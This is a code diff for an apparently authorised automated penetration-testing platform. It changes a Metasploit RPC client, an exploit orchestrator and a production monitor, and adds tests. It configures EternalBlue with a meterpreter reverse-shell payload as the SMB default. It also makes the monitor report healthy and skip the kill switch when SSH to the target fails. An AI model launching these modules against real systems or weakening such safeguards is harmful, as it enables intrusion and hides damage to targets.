@@ -104,6 +104,7 @@ FROM python:3.11-slim
 # Instalar dependencias del sistema mínimas si es necesario
 RUN apt-get update && apt-get install -y \
     wget \
+    curl \
     && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
@@ -938,6 +939,12 @@ services:
         condition: service_healthy
       redis:
         condition: service_healthy
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:8001/health"]
+      interval: 30s
+      timeout: 10s
+      start_period: 15s
+      retries: 3
     networks:
       - scanops
 
@@ -952,7 +959,7 @@ services:
       OPENVAS_PASS: [REDACTED]
       ZAP_HOST: scanops-zap
       ZAP_PORT: 8080
-      OLLAMA_MODEL: "qwen3.5:latest"
+      OLLAMA_MODEL: "mistral:7b"
       OLLAMA_BASE_URL: "http://host.docker.internal:11434"
     depends_on:
       postgres:
@@ -1061,7 +1068,7 @@ services:
     environment:
       DATABASE_URL: postgresql://scanops:scanops@postgres:5432/scanops
       REDIS_URL: redis://redis:6379/0
-      MSF_HOST: 10.202.15.254
+      MSF_HOST: 10.202.15.199
       MSF_PORT: 55553
       MSF_PASSWORD: [REDACTED]
       NXC_TIMEOUT: 30
@@ -1449,7 +1456,8 @@ dependencies = [
     "aiohttp>=3.9.0",
     "lxml>=4.9.0",
     "PyYAML>=6.0",
-    "dnspython>=2.4.0"
+    "dnspython>=2.4.0",
+    "msgpack>=1.0.0"
 ]
 requires-python = ">=3.8"
 
@@ -7162,6 +7170,7 @@ Run: uvicorn services.asset_manager.main:app --host 0.0.0.0 --port 8001
 """
 
 from fastapi import FastAPI, Depends, HTTPException, Query
+from fastapi.responses import JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from contextlib import asynccontextmanager
 import logging
@@ -7303,12 +7312,15 @@ async def http_exception_handler(request, exc: HTTPException):
     """
     Custom HTTP exception handler.
     """
-    return {
-        "error": True,
-        "status_code": exc.status_code,
-        "detail": exc.detail,
-        "timestamp": datetime.utcnow().isoformat(),
-    }
+    return JSONResponse(
+        status_code=exc.status_code,
+        content={
+            "error": True,
+            "status_code": exc.status_code,
+            "detail": exc.detail,
+            "timestamp": datetime.utcnow().isoformat(),
+        },
+    )
 
 @app.exception_handler(Exception)
 async def general_exception_handler(request, exc: Exception):
@@ -7316,12 +7328,15 @@ async def general_exception_handler(request, exc: Exception):
     General exception handler for unhandled errors.
     """
     logger.error(f"Unhandled exception: {str(exc)}", exc_info=True)
-    return {
-        "error": True,
-        "status_code": 500,
-        "detail": "Internal server error",
-        "timestamp": datetime.utcnow().isoformat(),
-    }
+    return JSONResponse(
+        status_code=500,
+        content={
+            "error": True,
+            "status_code": 500,
+            "detail": "Internal server error",
+            "timestamp": datetime.utcnow().isoformat(),
+        },
+    )
 
 if __name__ == "__main__":
     import uvicorn
@@ -10538,8 +10553,7 @@ class ExploitExecutor:
                 module_path=msf_module,
                 target_host=target_ip,
                 target_port=target_port,
-                payload=payload,
-                options={'SESSION': approval_id}  # Passar approval_id para tracking
+                payload=payload
             )
 
             if not result or not result.get('success'):
@@ -11626,7 +11640,7 @@ try:
     from config import DB_CONFIG, TARGETS, EXPLOITS
     from kill_switch_service import kill_switch_svc
     from exploit_executor import get_executor
-    from msf_client import get_msf_client
+    from msf_client import get_msf_client, get_fresh_msf_client
     from hydra_executor import get_hydra_executor
     from netexec_client import get_netexec_client
     from production_monitor import get_monitor
@@ -11659,7 +11673,7 @@ class M4Orchestrator:
         self.executor = get_executor()
         self.hydra_executor = get_hydra_executor()
         self.netexec = get_netexec_client()
-        self.msf = get_msf_client()
+        self.msf = get_fresh_msf_client()
         self.approval_svc = ApprovalService(db_config)
 
     def _get_connection(self):
@@ -11924,13 +11938,13 @@ class M4Orchestrator:
             if approval_id:
                 query = """
                     SELECT * FROM m4_approvals
-                    WHERE id = %s AND status = 'PENDING'
+                    WHERE id = %s AND status = 'APPROVED'
                 """
                 params = (approval_id,)
             else:
                 query = """
                     SELECT * FROM m4_approvals
-                    WHERE status = 'PENDING'
+                    WHERE status = 'APPROVED'
                     AND created_at > NOW() - INTERVAL '7 days'
                     ORDER BY created_at ASC
                 """
@@ -11992,6 +12006,68 @@ class M4Orchestrator:
             if conn:
                 conn.close()
 
+    def _get_msf_defaults_for_cve(self, cve: str, vuln_row: dict) -> dict:
+        """
+        Returns the best MSF module/payload/port based on CVE id or service context.
+        Used when vuln_findings does not have msf_module populated (Nuclei findings).
+        """
+        cve_upper = cve.upper() if cve else ''
+        service = (vuln_row.get('affected_service') or '').lower()
+        port = vuln_row.get('affected_port')
+
+        # HTTP/HTTPS findings → auxiliary scanner (no payload needed)
+        if service in ('http', 'https') or port in (80, 443, 8080, 8443):
+            return {
+                'msf_module': 'auxiliary/scanner/http/http_version',
+                'payload': '',
+                'port': port or 80,
+                'platform': 'linux'
+            }
+
+        # PHPInfo exposed (common Nuclei finding)
+        if 'phpinfo' in cve_upper or 'phpinfo' in (vuln_row.get('vulnerability_id') or '').lower():
+            return {
+                'msf_module': 'auxiliary/scanner/http/phpinfo',
+                'payload': '',
+                'port': port or 80,
+                'platform': 'linux'
+            }
+
+        # SSH findings
+        if service == 'ssh' or port == 22:
+            return {
+                'msf_module': 'auxiliary/scanner/ssh/ssh_version',
+                'payload': '',
+                'port': port or 22,
+                'platform': 'linux'
+            }
+
+        # SMB findings (Windows)
+        if service == 'smb' or port == 445:
+            return {
+                'msf_module': 'exploit/windows/smb/ms17_010_eternalblue',
+                'payload': 'windows/x64/meterpreter/reverse_tcp',
+                'port': port or 445,
+                'platform': 'windows'
+            }
+
+        # SSL/TLS findings
+        if 'ssl' in cve_upper or 'tls' in cve_upper or port in (443, 8443):
+            return {
+                'msf_module': 'auxiliary/scanner/ssl/openssl_heartbleed',
+                'payload': '',
+                'port': port or 443,
+                'platform': 'linux'
+            }
+
+        # Generic fallback — auxiliary scanner, not exploit
+        return {
+            'msf_module': 'auxiliary/scanner/portscan/tcp',
+            'payload': '',
+            'port': port or 80,
+            'platform': 'linux'
+        }
+
     def _get_vulnerability_info(self, cve: str) -> Optional[Dict]:
         """Obtiene información de vulnerabilidad"""
         conn = None
@@ -12010,30 +12086,21 @@ class M4Orchestrator:
                 vuln = cur.fetchone()
 
             if vuln:
+                defaults = self._get_msf_defaults_for_cve(cve, dict(vuln))
                 return {
-                    'msf_module': vuln.get('msf_module') or 'exploit/windows/smb/ms17_010',
-                    'payload': vuln.get('payload') or 'generic/shell_reverse_tcp',
-                    'port': vuln.get('affected_port') or 445,
-                    'platform': vuln.get('asset_os') or 'windows'
+                    'msf_module': vuln.get('msf_module') or defaults['msf_module'],
+                    'payload': vuln.get('payload') or defaults['payload'],
+                    'port': vuln.get('affected_port') or defaults['port'],
+                    'platform': vuln.get('asset_os') or defaults['platform']
                 }
 
             # Si no existe en la tabla, devolvemos defaults basados en el CVE o genéricos
             # permitiendo que la fase 2 continúe
-            return {
-                'msf_module': 'exploit/windows/smb/ms17_010',
-                'payload': 'generic/shell_reverse_tcp',
-                'port': 445,
-                'platform': 'windows'
-            }
+            return self._get_msf_defaults_for_cve(cve, {})
 
         except Exception as e:
             logger.warning(f"⚠️ Error obteniendo vulnerabilidad de DB: {e}. Usando defaults.")
-            return {
-                'msf_module': 'exploit/windows/smb/ms17_010',
-                'payload': 'generic/shell_reverse_tcp',
-                'port': 445,
-                'platform': 'windows'
-            }
+            return self._get_msf_defaults_for_cve(cve, {})
         finally:
             if conn:
                 conn.close()
@@ -12259,6 +12326,7 @@ class MSFClient:
     def login(self) -> bool:
         """Autentica contra Metasploit RPC"""
         try:
+            self.token = None  # Reset before login attempt
             res = self._rpc_call('auth.login', self.username, self.password)
             if res and res.get('result') == 'success':
                 self.token = res.get('token')
@@ -12291,18 +12359,21 @@ class MSFClient:
             logger.error("No autenticado")
             return None
 
+        is_auxiliary = module_path.startswith('auxiliary/')
         exploit_options = {
             'RHOSTS': target_host,
             'RPORT': target_port,
-            'PAYLOAD': payload,
-            'LHOST': lhost,
-            'LPORT': lport,
         }
+        if not is_auxiliary and payload:
+            exploit_options['PAYLOAD'] = payload
+            exploit_options['LHOST'] = lhost
+            exploit_options['LPORT'] = lport
         if options:
             exploit_options.update(options)
 
         # RPC: module.execute(type, name, options)
-        res = self._rpc_call('module.execute', 'exploit', module_path, exploit_options)
+        module_type = 'auxiliary' if is_auxiliary else 'exploit'
+        res = self._rpc_call('module.execute', module_type, module_path, exploit_options)
 
         if res and ('job_id' in res or 'uuid' in res):
             logger.info(f"✅ Exploit lanzado: {module_path}")
@@ -12370,6 +12441,10 @@ def get_msf_client() -> MSFClient:
     if _msf_client is None:
         _msf_client = MSFClient()
     return _msf_client
+
+def get_fresh_msf_client() -> MSFClient:
+    """Returns a fresh MSFClient instance, bypassing singleton."""
+    return MSFClient()
 FILE:services\exploit_engine\netexec_client.py
 """
 NetExec Client (Successor of CrackMapExec)
@@ -13013,6 +13088,8 @@ class ProductionMonitor:
         self._running = False
         self._thread = None
         self._approval_id = None
+        self._ssh_failure_count = 0
+        self._max_ssh_failures = 3
 
         logger.info(f"ProductionMonitor iniciado: {self.target_ip}")
 
@@ -13045,15 +13122,19 @@ class ProductionMonitor:
             )
 
             if result.returncode == 0:
+                self._ssh_failure_count = 0
                 return result.stdout.strip()
             else:
+                self._ssh_failure_count += 1
                 logger.warning(f"⚠️ SSH command failed: {result.stderr}")
                 return None
 
         except subprocess.TimeoutExpired:
+            self._ssh_failure_count += 1
             logger.error(f"❌ SSH timeout en {self.target_ip}")
             return None
         except Exception as e:
+            self._ssh_failure_count += 1
             logger.error(f"❌ SSH error: {e}")
             return None
 
@@ -13068,10 +13149,10 @@ class ProductionMonitor:
 
         if output is None:
             return {
-                'ok': False,
+                'ok': True,
                 'value': 0,
                 'threshold': self.config['cpu_threshold'],
-                'message': 'No se pudo obtener CPU (SSH caído)'
+                'message': 'CPU: SSH no disponible (monitorización suspendida)'
             }
 
         try:
@@ -13103,10 +13184,10 @@ class ProductionMonitor:
 
         if output is None:
             return {
-                'ok': False,
+                'ok': True,
                 'value': 0,
                 'threshold': self.config['memory_threshold'],
-                'message': 'No se pudo obtener RAM (SSH caído)'
+                'message': 'RAM: SSH no disponible (monitorización suspendida)'
             }
 
         try:
@@ -13139,7 +13220,12 @@ class ProductionMonitor:
         for port in self.config['ports']:
             output = self._ssh_command(f"ss -tnl | grep ':{port} '")
 
-            if output is None or output.strip() == '':
+            if output is None:
+                # SSH failed - skip this port check, don't mark as down
+                logger.warning(f"SSH no disponible para verificar puerto {port}")
+                continue
+
+            if output.strip() == '':
                 services_down.append(port)
                 logger.warning(f"⚠️ Puerto {port} no está escuchando en {self.target_ip}")
 
@@ -13162,10 +13248,10 @@ class ProductionMonitor:
 
         if output is None:
             return {
-                'ok': False,
+                'ok': True,
                 'value': 0,
                 'threshold': self.config['connections_threshold'],
-                'message': 'No se pudo obtener conexiones (SSH caído)'
+                'message': 'Conexiones: SSH no disponible (monitorización suspendida)'
             }
 
         try:
@@ -13207,6 +13293,22 @@ class ProductionMonitor:
 
         # Hay impacto si CUALQUIER check falla
         impact_detected = not (cpu['ok'] and memory['ok'] and services['ok'] and connections['ok'])
+
+        # Don't trigger kill switch if ALL failures are due to SSH unreachability
+        all_ssh_failures = all(
+            'SSH no disponible' in c.get('message', '')
+            for c in [cpu, memory, services, connections]
+            if not c['ok']
+        )
+        if (all_ssh_failures and impact_detected) or self._ssh_failure_count >= self._max_ssh_failures:
+            logger.warning(f"⚠️ SSH no disponible en {self.target_ip} - monitorización suspendida, NO activando kill switch")
+            return {
+                'ok': True,
+                'impact_detected': False,
+                'ssh_unavailable': True,
+                'checks': {'cpu': cpu, 'memory': memory, 'services': services, 'connections': connections},
+                'timestamp': datetime.now().isoformat()
+            }
 
         result = {
             'ok': not impact_detected,
@@ -13340,6 +13442,12 @@ ACCIÓN REQUERIDA: Revisar el estado del servidor {self.target_ip}
             try:
                 result = self.check_all()
 
+                if result.get('ssh_unavailable'):
+                    logger.warning("⚠️ Monitor en modo degradado: SSH no disponible")
+                    # Continue monitoring but don't kill switch
+                    time.sleep(self.check_interval)
+                    continue
+
                 if result['impact_detected']:
                     self._trigger_kill_switch(result['checks'])
                     # Parar monitorización después de activar kill switch
@@ -13384,8 +13492,10 @@ _monitor = None
 def get_monitor(config=None) -> ProductionMonitor:
     """Obtiene instancia singleton del monitor"""
     global _monitor
-    if _monitor is None:
+    if config is not None:
         _monitor = ProductionMonitor(config)
+    elif _monitor is None:
+        _monitor = ProductionMonitor()
     return _monitor
 FILE:services\exploit_engine\tasks.py
 
@@ -14844,6 +14954,174 @@ def test_orchestrator_includes_netexec_phase(mock_hydra, mock_monitor, mock_msf,
     assert 'netexec_laterals' in result
     assert result['netexec_laterals'] > 0
     assert mock_nxc.check_smb.called or mock_nxc.check_ssh.called
+FILE:services\exploit_engine\tests\test_msf_fallback.py
+import pytest
+from unittest.mock import patch, MagicMock
+
+from services.exploit_engine.m4_orchestrator import M4Orchestrator
+from services.exploit_engine.exploit_executor import ExploitExecutor
+from services.exploit_engine.msf_client import MSFClient
+
+# --- 1-4. Tests for M4Orchestrator ---
+
+def test_get_vulnerability_info_http():
+    """1. _get_vulnerability_info() with HTTP service returns auxiliary/scanner/http module, not ms17_010"""
+    orc = M4Orchestrator()
+    with patch.object(M4Orchestrator, '_get_connection') as mock_conn:
+        mock_cursor = MagicMock()
+        mock_cursor.fetchone.return_value = {
+            'affected_service': 'http',
+            'affected_port': 80,
+            'msf_module': None,
+            'payload': None,
+            'asset_os': 'linux'
+        }
+        mock_conn.return_value.cursor.return_value.__enter__.return_value = mock_cursor
+
+        info = orc._get_vulnerability_info("CVE-2021-1234")
+        assert info['msf_module'] == 'auxiliary/scanner/http/http_version'
+        assert info['payload'] == ''
+        assert info['platform'] == 'linux'
+
+def test_get_vulnerability_info_ssh():
+    """2. _get_vulnerability_info() with SSH service returns auxiliary/scanner/ssh module"""
+    orc = M4Orchestrator()
+    with patch.object(M4Orchestrator, '_get_connection') as mock_conn:
+        mock_cursor = MagicMock()
+        mock_cursor.fetchone.return_value = {
+            'affected_service': 'ssh',
+            'affected_port': 22,
+            'msf_module': None,
+            'payload': None,
+            'asset_os': 'linux'
+        }
+        mock_conn.return_value.cursor.return_value.__enter__.return_value = mock_cursor
+
+        info = orc._get_vulnerability_info("CVE-2021-1234")
+        assert info['msf_module'] == 'auxiliary/scanner/ssh/ssh_version'
+        assert info['payload'] == ''
+        assert info['platform'] == 'linux'
+
+def test_get_vulnerability_info_smb():
+    """3. _get_vulnerability_info() with SMB service still returns ms17_010 (Windows path preserved)"""
+    orc = M4Orchestrator()
+    with patch.object(M4Orchestrator, '_get_connection') as mock_conn:
+        mock_cursor = MagicMock()
+        mock_cursor.fetchone.return_value = {
+            'affected_service': 'smb',
+            'affected_port': 445,
+            'msf_module': None,
+            'payload': None,
+            'asset_os': 'windows'
+        }
+        mock_conn.return_value.cursor.return_value.__enter__.return_value = mock_cursor
+
+        info = orc._get_vulnerability_info("CVE-2017-0144")
+        assert info['msf_module'] == 'exploit/windows/smb/ms17_010_eternalblue'
+        assert info['payload'] == 'windows/x64/meterpreter/reverse_tcp'
+        assert info['platform'] == 'windows'
+
+def test_get_vulnerability_info_fallback():
+    """4. _get_vulnerability_info() with empty CVE and no port returns generic auxiliary fallback"""
+    orc = M4Orchestrator()
+    with patch.object(M4Orchestrator, '_get_connection') as mock_conn:
+        mock_cursor = MagicMock()
+        mock_cursor.fetchone.return_value = None  # No row found
+        mock_conn.return_value.cursor.return_value.__enter__.return_value = mock_cursor
+
+        info = orc._get_vulnerability_info("")
+        assert info['msf_module'] == 'auxiliary/scanner/portscan/tcp'
+        assert info['payload'] == ''
+        assert info['platform'] == 'linux'
+
+# --- 5. Test for ExploitExecutor ---
+
+@patch('services.exploit_engine.exploit_executor.kill_switch_svc')
+def test_execute_executor_no_session_option(mock_kill_switch):
+    """5. execute() in ExploitExecutor does NOT pass SESSION in options to msf.execute_exploit"""
+    mock_kill_switch.is_active.return_value = False
+    exe = ExploitExecutor()
+
+    with patch.object(exe, 'msf') as mock_msf, patch.object(exe, '_save_exploit_result'):
+        mock_msf.is_authenticated.return_value = True
+        mock_msf.execute_exploit.return_value = {'success': True, 'session_id': 1}
+
+        exe.execute(
+            cve="CVE-1234",
+            target_ip="1.2.3.4",
+            target_port=80,
+            msf_module="auxiliary/scanner/http/http_version",
+            payload="",
+            approval_id=99,
+            executor_email="test@test.com",
+            ip_origin="127.0.0.1"
+        )
+
+        mock_msf.execute_exploit.assert_called_once_with(
+            module_path="auxiliary/scanner/http/http_version",
+            target_host="1.2.3.4",
+            target_port=80,
+            payload=""
+        )
+
+# --- 6-8. Tests for MSFClient ---
+
+def test_execute_exploit_auxiliary_module():
+    """6 & 8. execute_exploit() for auxiliary module does NOT include PAYLOAD/LHOST/LPORT in options, uses module_type='auxiliary'"""
+    msf = MSFClient()
+    msf.token = "fake_token"
+    with patch.object(msf, '_rpc_call') as mock_rpc:
+        mock_rpc.return_value = {'job_id': 1}
+        msf.execute_exploit(
+            module_path="auxiliary/scanner/http/http_version",
+            target_host="1.2.3.4",
+            target_port=80,
+            payload="should_be_ignored",
+            lhost="1.1.1.1",
+            lport=4444
+        )
+
+        mock_rpc.assert_called_once()
+        args = mock_rpc.call_args[0]
+        assert args[0] == 'module.execute'
+        assert args[1] == 'auxiliary'
+        assert args[2] == 'auxiliary/scanner/http/http_version'
+
+        options = args[3]
+        assert 'PAYLOAD' not in options
+        assert 'LHOST' not in options
+        assert 'LPORT' not in options
+        assert options['RHOSTS'] == '1.2.3.4'
+        assert options['RPORT'] == 80
+
+def test_execute_exploit_exploit_module():
+    """7 & 8. execute_exploit() for exploit module DOES include PAYLOAD/LHOST/LPORT, uses module_type='exploit'"""
+    msf = MSFClient()
+    msf.token = "fake_token"
+    with patch.object(msf, '_rpc_call') as mock_rpc:
+        mock_rpc.return_value = {'job_id': 2}
+        msf.execute_exploit(
+            module_path="exploit/windows/smb/ms17_010_eternalblue",
+            target_host="1.2.3.4",
+            target_port=445,
+            payload="windows/x64/meterpreter/reverse_tcp",
+            lhost="1.1.1.1",
+            lport=4444
+        )
+
+        mock_rpc.assert_called_once()
+        args = mock_rpc.call_args[0]
+        assert args[0] == 'module.execute'
+        assert args[1] == 'exploit'
+        assert args[2] == 'exploit/windows/smb/ms17_010_eternalblue'
+
+        options = args[3]
+        assert 'PAYLOAD' in options
+        assert options['PAYLOAD'] == 'windows/x64/meterpreter/reverse_tcp'
+        assert options['LHOST'] == '1.1.1.1'
+        assert options['LPORT'] == 4444
+        assert options['RHOSTS'] == '1.2.3.4'
+        assert options['RPORT'] == 445
 FILE:services\exploit_engine\tests\test_netexec_client.py
 import pytest
 from unittest.mock import MagicMock, patch
@@ -14973,6 +15251,114 @@ def test_factory():
     c2 = get_netexec_client()
     assert c1 is c2
     assert isinstance(c1, NetExecClient)
+FILE:services\exploit_engine\tests\test_production_monitor.py
+import pytest
+from unittest.mock import patch, MagicMock
+from services.exploit_engine.production_monitor import ProductionMonitor, get_monitor
+import services.exploit_engine.production_monitor as pm_module
+
+@pytest.fixture
+def monitor():
+    config = {
+        'target_ip': '127.0.0.1',
+        'ssh_user': 'test',
+        'check_interval': 1,
+        'cpu_threshold': 90,
+        'memory_threshold': 90,
+        'connections_threshold': 100,
+        'services': ['ssh'],
+        'ports': [22, 80]
+    }
+    return ProductionMonitor(config)
+
+def test_get_monitor_singleton_new_config():
+    """1. get_monitor(config) always creates a new instance when config is passed"""
+    config1 = {'target_ip': '1.1.1.1', 'ssh_user': 'user1'}
+    monitor1 = get_monitor(config1)
+
+    assert monitor1.target_ip == '1.1.1.1'
+
+    # Passing same or no config returns same instance if no config passed
+    monitor2 = get_monitor()
+    assert monitor1 is monitor2
+
+    # Passing new config creates new instance
+    config2 = {'target_ip': '2.2.2.2', 'ssh_user': 'user2'}
+    monitor3 = get_monitor(config2)
+
+    assert monitor3.target_ip == '2.2.2.2'
+    assert monitor3 is not monitor1
+
+@patch.object(ProductionMonitor, '_ssh_command')
+def test_check_cpu_ssh_failure(mock_ssh, monitor):
+    """2. check_cpu() returns ok=True when SSH returns None"""
+    mock_ssh.return_value = None
+
+    result = monitor.check_cpu()
+
+    assert result['ok'] is True
+    assert 'SSH no disponible' in result['message']
+
+@patch.object(ProductionMonitor, '_ssh_command')
+def test_check_memory_ssh_failure(mock_ssh, monitor):
+    """3. check_memory() returns ok=True when SSH returns None"""
+    mock_ssh.return_value = None
+
+    result = monitor.check_memory()
+
+    assert result['ok'] is True
+    assert 'SSH no disponible' in result['message']
+
+@patch.object(ProductionMonitor, '_ssh_command')
+def test_check_services_ssh_failure(mock_ssh, monitor):
+    """4. check_services() skips port when SSH returns None (doesn't add to services_down)"""
+    # 2 ports in config: [22, 80]
+    # Simulate SSH failure (None) for port 22, and empty string for port 80 (down)
+    mock_ssh.side_effect = [None, '']
+
+    result = monitor.check_services()
+
+    # Port 22 should be skipped entirely, not marked as down.
+    # Port 80 should be marked as down.
+    assert 22 not in result['services_down']
+    assert 80 in result['services_down']
+    assert result['ok'] is False # Because port 80 is down
+
+@patch.object(ProductionMonitor, '_ssh_command')
+def test_check_all_ssh_failures(mock_ssh, monitor):
+    """5. check_all() returns impact_detected=False when all failures are SSH-related"""
+    # Simulate 3 consecutive SSH failures to trigger the ssh_unavailable logic
+    mock_ssh.return_value = None
+    monitor._ssh_failure_count = 3
+
+    result = monitor.check_all()
+
+    assert result['ok'] is True
+    assert result['impact_detected'] is False
+    assert result['ssh_unavailable'] is True
+
+@patch.object(ProductionMonitor, 'check_all')
+@patch.object(ProductionMonitor, '_trigger_kill_switch')
+def test_monitor_loop_ssh_unavailable(mock_trigger, mock_check_all, monitor):
+    """6. _monitor_loop() does NOT call _trigger_kill_switch() when ssh_unavailable=True"""
+    # Mock check_all to return ssh_unavailable=True and impact_detected=False
+    mock_check_all.return_value = {
+        'ok': True,
+        'impact_detected': False,
+        'ssh_unavailable': True,
+        'checks': {}
+    }
+
+    # We need to stop the loop after one iteration
+    def stop_loop():
+        monitor._running = False
+
+    mock_check_all.side_effect = lambda: stop_loop() or mock_check_all.return_value
+
+    monitor._running = True
+    monitor._monitor_loop()
+
+    mock_trigger.assert_not_called()
 FILE:services\recon_engine\__init__.py
 """Recon Engine - M2 Microservice"""
 __version__ = "1.0.0"
